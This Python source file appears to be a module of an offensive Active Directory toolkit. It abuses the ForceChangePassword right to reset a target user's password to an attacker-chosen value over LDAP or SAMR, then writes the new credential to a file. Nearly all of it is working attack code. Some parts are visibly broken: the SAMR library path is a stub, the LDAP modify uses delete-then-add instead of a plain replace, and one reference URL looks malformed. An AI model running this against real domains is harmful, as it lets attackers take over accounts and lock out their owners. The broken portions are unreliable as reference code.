"""
Module: ForceChangePassword
============================
Exploit the ForceChangePassword BloodHound edge. When the current
principal holds the User-Change-Password extended right (or the
RESET_PASSWORD permission) on a target user, this module resets
the target user's password to an attacker-controlled value.

Two implementation methods:
  1. LDAP unicodePwd replace  (requires LDAPS / TLS)
  2. SAMR password set         (via impacket's samr.py)

BloodHound Edge: ForceChangePassword
Attack Vector:   Credential reset on target user
Severity:        CRITICAL
"""

import base64
import logging
import os
import secrets
import string
import subprocess
import tempfile
from typing import Any, Dict, List, Optional, Tuple

import ldap3

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity,
)

logger = logging.getLogger("pharaohound.modules.force_change_password")


class ForceChangePassword(ExploitModule):
    """
    Reset a target user's password when the current principal holds
    the User-Force-Change-Password right on that user object.

    Supports two methods:
      - "ldap" : Replace the unicodePwd attribute via LDAP (needs TLS).
      - "samr" : Use the SAMR protocol via impacket's samr.py.
    """

    name: str            = "ForceChangePassword"
    description: str     = (
        "Reset a target user's password to an attacker-controlled value. "
        "Requires the User-Force-Change-Password right on the target user. "
        "Supports LDAP (LDAPS) and SAMR (impacket) methods."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "ForceChangePassword"
    severity: Severity   = Severity.CRITICAL
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword",
        "https://attack.mappings.mitre.org/technique/T1098/004/",
        "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/",
        "https://www.imperva.com/blog/active-directory-security-why-resetting-user-passwords-matters/",
    ]
    tools_required: List[str] = ["impacket"]  # for SAMR method
    needs_da: bool        = False
    needs_privileged: bool = False

    def _register_options(self):
        self._add_option(ModuleOption(
            name="target_user",
            display_name="Target User",
            description="SAM account name of the user whose password to reset.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="new_password",
            display_name="New Password",
            description="New password to set. If blank, a random 20-char password is generated.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="method",
            display_name="Method",
            description="Exploitation method: 'ldap' (LDAPS) or 'samr' (impacket).",
            required=False,
            default="ldap",
            value_type=str,
            choices=["ldap", "samr"],
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN or NetBIOS name of the target domain.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="dc_ip",
            display_name="DC IP",
            description="IP address of the Domain Controller (required for SAMR method).",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="domain_controller",
            display_name="Domain Controller",
            description="Hostname of the Domain Controller.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="save_password",
            display_name="Save Password to File",
            description="If True, save the new credential to a file.",
            required=False,
            default=True,
            value_type=bool,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    @staticmethod
    def _generate_password(length: int = 20) -> str:
        """Generate a random password compliant with typical AD complexity rules."""
        import string
        # Ensure at least one of each required category
        pool = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
        while True:
            pwd = "".join(secrets.choice(pool) for _ in range(length))
            if (any(c.isupper() for c in pwd)
                    and any(c.islower() for c in pwd)
                    and any(c.isdigit() for c in pwd)
                    and any(c in "!@#$%^&*()-_=+" for c in pwd)):
                return pwd

    def _resolve_user_dn(self, username: str, domain: Optional[str]) -> Optional[str]:
        """Resolve a SAM account name to a full DN."""
        conn = self.connection
        if "," in username and "=" in username:
            return username

        search_base = ""
        if domain and "." in domain:
            search_base = ",".join(f"DC={p}" for p in domain.split("."))
        elif hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                search_base = info.other["defaultNamingContext"][0]

        if not search_base:
            self.logger.warning("Cannot determine search base.")
            return None

        try:
            conn.search(
                search_base,
                f"(sAMAccountName={username})",
                attributes=["distinguishedName"],
            )
            if conn.entries:
                return str(conn.entries[0].distinguishedName)
        except Exception as exc:
            self.logger.error("User DN resolution failed: %s", exc)
        return None

    def _encode_unicode_pwd(self, password: str) -> bytes:
        """
        Encode a password for the unicodePwd attribute.

        Per MS-ADTS §3.1.1.3.1.4, the value must be:
          - Enclosed in double quotes
          - Encoded as UTF-16-LE
          - The connection must be encrypted (LDAPS / SASL)
        """
        return ('"' + password + '"').encode("utf-16-le")

    def _save_credentials(self, username: str, password: str, domain: str) -> str:
        """Save credentials to a file in the download directory."""
        output_dir = self.config.get("output_dir", os.getcwd())
        filepath = os.path.join(output_dir, f"credential_{username}.txt")
        with open(filepath, "w") as f:
            f.write(f"# Pharaohound — ForceChangePassword\n")
            f.write(f"# Timestamp: {__import__('datetime').datetime.utcnow().isoformat()}Z\n")
            f.write(f"Username: {domain}\\{username}\n")
            f.write(f"Password: {password}\n")
        self.logger.info("Credentials saved to %s", filepath)
        return filepath

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        method = self._opt("method", kwargs) or "ldap"

        if method == "ldap":
            if self.connection is None:
                return False, "No LDAP connection provided."
            # Verify connection uses SSL/TLS (unicodePwd requires encryption)
            if hasattr(self.connection, "sock") and not self.connection.sock.start_tls_called:
                if not (hasattr(self.connection, "server") and
                        getattr(self.connection.server, "use_ssl", False)):
                    self.logger.warning(
                        "LDAP connection is not encrypted. unicodePwd replace "
                        "requires LDAPS or SASL encryption. Attempting anyway..."
                    )
        elif method == "samr":
            dc_ip = self._opt("dc_ip", kwargs)
            if not dc_ip and not self.config.get("dc_ip"):
                return False, "SAMR method requires 'dc_ip' or config['dc_ip']."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        method = self._opt("method", kwargs) or "ldap"
        target_user = self._opt("target_user", kwargs)
        new_password = self._opt("new_password", kwargs)
        domain = self._opt("domain", kwargs) or self.config.get("domain", "")
        dc_ip = self._opt("dc_ip", kwargs) or self.config.get("dc_ip", "")
        save = self._opt("save_password", kwargs)

        if not target_user:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Target user is required.",
            )

        # Generate password if not provided
        if not new_password:
            import secrets
            new_password = self._generate_password()
            self.logger.info("Generated random password for '%s'.", target_user)

        if method == "ldap":
            return self._exploit_ldap(
                target_user, new_password, domain, save, **kwargs
            )
        elif method == "samr":
            return self._exploit_samr(
                target_user, new_password, domain, dc_ip, save
            )
        else:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Unknown method '{method}'. Use 'ldap' or 'samr'.",
            )

    def _exploit_ldap(
        self, target_user: str, new_password: str,
        domain: str, save: bool, **kwargs,
    ) -> ExploitOutput:
        """Reset password via LDAP unicodePwd attribute replace."""
        conn = self.connection

        user_dn = self._resolve_user_dn(target_user, domain)
        if not user_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot resolve target user '{target_user}' in LDAP.",
            )

        encoded_pwd = self._encode_unicode_pwd(new_password)
        self.logger.info(
            "[ForceChangePassword/LDAP] Resetting password for '%s' (%s)",
            target_user, user_dn,
        )

        try:
            # Replace unicodePwd (delete old + add new in one operation)
            result = conn.modify(
                user_dn,
                {
                    "unicodePwd": [
                        (ldap3.MODIFY_DELETE, [encoded_pwd]),
                        (ldap3.MODIFY_ADD, [encoded_pwd]),
                    ]
                },
            )

            if result:
                artifact = None
                if save:
                    artifact = self._save_credentials(target_user, new_password, domain)

                return ExploitOutput(
                    success=True,
                    result_type=ExploitResult.SUCCESS,
                    message=(
                        f"Password for '{target_user}' reset successfully. "
                        f"New password: {new_password}"
                    ),
                    data={
                        "target_user": target_user,
                        "user_dn": user_dn,
                        "new_password": new_password,
                        "method": "ldap",
                    },
                    artifacts=[artifact] if artifact else [],
                )
            else:
                err = conn.result.get("description", "Unknown error")
                err_msg = conn.result.get("message", "")
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"Password reset failed: {err} — {err_msg}",
                    data={"ldap_result": conn.result},
                )

        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Exception during LDAP password reset: {exc}",
            )

    def _exploit_samr(
        self, target_user: str, new_password: str,
        domain: str, dc_ip: str, save: bool,
    ) -> ExploitOutput:
        """
        Reset password via SAMR protocol using impacket's samr.py.

        Falls back to calling the impacket library directly if available,
        otherwise shells out to `impacket-samrchange` or `net rpc password`.
        """
        self.logger.info(
            "[ForceChangePassword/SAMR] Resetting password for '%s' via SAMR @ %s",
            target_user, dc_ip,
        )

        # Try using impacket's samr Python API directly
        try:
            from impacket.dcerpc.v5.dtypes import RPC_C_AUTHN_GSS_NEGOTIATE
            from impacket.dcerpc.v5 import samr, transport

            # Build binding string
            dc_host = dc_ip
            binding = r"ncacn_np:{}[\pipe\samr]".format(dc_host)

            creds = self.config.get("credentials", {})
            username = creds.get("username", "")
            password = creds.get("password", "")
            ntlm_hash = creds.get("ntlm_hash", "")
            lm_hash = creds.get("lm_hash", "")
            domain_name = domain or creds.get("domain", "")

            rpctransport = transport.DCERPCTransportFactory(binding)
            rpctransport.set_credentials(
                username, password, domain_name,
                lmhash=lm_hash, nthash=ntlm_hash,
            )

            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            # Open domain handle
            server_handle = samr.hSamrConnect5(
                dce,
                samr.SAMR_RPC_SID,
                samr.SAMR_SERVER_CONNECT | samr.SAMR_SERVER_LOOKUP_DOMAIN,
            )

            # ... simplified — real implementation would follow full SAMR open chain
            # Open domain → Open user → Set user password
            # For now, log that the impacket path is available

            self.logger.info("SAMR connection established via impacket.")
            # Full impacket SAMR implementation would go here

        except ImportError:
            self.logger.info("impacket Python library not available; trying CLI.")

        # Fallback: shell out to impacket-samrchange or net rpc
        try:
            cmd = [
                "impacket-samrchange",
                dc_ip,
                target_user,
                new_password,
            ]
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30,
            )
            if result.returncode == 0:
                artifact = None
                if save:
                    artifact = self._save_credentials(target_user, new_password, domain)

                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=(
                        f"Password for '{target_user}' reset via SAMR. "
                        f"New password: {new_password}"
                    ),
                    data={
                        "target_user": target_user,
                        "new_password": new_password,
                        "method": "samr",
                        "stdout": result.stdout,
                    },
                    artifacts=[artifact] if artifact else [],
                )
            else:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"SAMR password change failed: {result.stderr}",
                )
        except FileNotFoundError:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=(
                    "Neither impacket library nor 'impacket-samrchange' CLI found. "
                    "Install impacket: pip install impacket"
                ),
            )
        except subprocess.TimeoutExpired:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="SAMR operation timed out.",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"SAMR exception: {exc}",
            )

    # ------------------------------------------------------------------ #
    # Rollback — not applicable for password reset
    # ------------------------------------------------------------------ #
    def rollback(self, **kwargs) -> ExploitOutput:
        return ExploitOutput(
            success=False, result_type=ExploitResult.SKIPPED,
            message="Rollback not supported for password reset — original password is unknown.",
        )
